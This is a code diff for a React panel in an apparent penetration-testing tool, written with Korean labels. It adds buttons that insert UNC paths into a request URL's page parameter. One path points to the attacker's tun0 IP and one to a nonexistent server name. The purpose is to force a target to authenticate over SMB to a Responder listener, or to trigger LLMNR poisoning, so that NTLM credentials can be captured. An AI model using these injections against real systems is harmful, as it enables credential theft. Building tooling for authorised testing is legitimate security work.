@@ -31,9 +31,7 @@ export function GraphRequestPanel(props: {
     }).catch(() => undefined);
     return () => { cancelled = true; };
   }, []);
-  const insertResponderIp = () => {
-    if (!lhost) return;
-    const snippet = `\\\\${lhost}\\test`;
+  const insertUncPath = (snippet: string) => {
     const pageParam = /([?&]page=)([^&]*)/.exec(url);
     if (pageParam) {
       const start = pageParam.index + pageParam[1].length;
@@ -48,6 +46,9 @@ export function GraphRequestPanel(props: {
       urlInput.current?.focus();
       urlInput.current?.setSelectionRange(cursor, cursor);
     });
+  };
+  const insertSmbDirectPath = () => {
+    if (lhost) insertUncPath(`\\\\${lhost}\\test`);
   };
 
   const requestPayload = () => ({
@@ -112,10 +113,16 @@ export function GraphRequestPanel(props: {
       </select>
       <input ref={urlInput} aria-label="Request URL" value={url} onChange={(e) => setUrl(e.target.value)}
         style={S.requestUrl} />
-      <button style={S.responderInsert} disabled={!lhost} onClick={insertResponderIp}
-        title="URL 커서 위치 또는 page 파라미터에 UNC 경로 삽입">
-        {lhost ? `RESPONDER IP · ${lhost}` : "TUN0 확인 중"}
-      </button>
+      <div style={S.requestTechniqueActions}>
+        <button style={S.requestTechniqueButton} disabled={!lhost} onClick={insertSmbDirectPath}
+          title={lhost ? `\\\\${lhost}\\test 삽입` : "tun0 IP 확인 중"}>
+          SMB Direct Injection 시도
+        </button>
+        <button style={S.requestTechniqueButton} onClick={() => insertUncPath("\\\\UNKNOWN-SERVER\\share")}
+          title="\\\\UNKNOWN-SERVER\\share 삽입">
+          LLMNR 시도
+        </button>
+      </div>
       <button style={S.requestSend} disabled={state !== "idle"}
         onClick={() => void send()}>{state === "sending" ? "전송 중" : "SEND"}</button>
     </div>
